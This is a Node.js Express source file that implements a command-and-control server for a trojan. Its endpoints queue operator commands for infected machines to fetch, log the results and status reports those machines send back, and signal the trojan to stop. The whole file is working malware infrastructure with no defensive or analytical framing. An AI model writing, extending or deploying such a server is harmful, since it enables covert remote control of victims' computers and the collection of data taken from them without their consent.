const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

let commands = [];
let status = "";
let trojanRunning = true;

app.use(bodyParser.json());

// Endpoint to get current configuration (commands)
app.get('/config', (req, res) => {
    res.json({
        stop: !trojanRunning,
        commands: commands
    });
    // Clear the commands after sending them to the trojan
    commands = [];
});

// Endpoint to receive command results
app.post('/command', (req, res) => {
    const { command, result } = req.body;
    console.log(`Received result for command '${command}': ${result}`);
    res.sendStatus(200);
});

// Endpoint to update trojan status
app.post('/status', (req, res) => {
    const { id, status: newStatus } = req.body;
    status = newStatus;
    console.log(`Trojan ID: ${id} Status: ${status}`);
    res.sendStatus(200);
});

// Endpoint to send new commands to the trojan
app.post('/send-command', (req, res) => {
    const { command } = req.body;
    if (command) {
        commands.push(command);
        console.log(`Command '${JSON.stringify(command)}' added to queue.`);
        res.sendStatus(200);
    } else {
        console.log("Invalid command format.");
        res.sendStatus(400);
    }
});

// Endpoint to stop the trojan
app.post('/stop-trojan', (req, res) => {
    trojanRunning = false;
    console.log("Trojan stop signal sent.");
    res.sendStatus(200);
});

// Start server
app.listen(port, () => {
    console.log(`Node.js server running at http://localhost:${port}`);
});

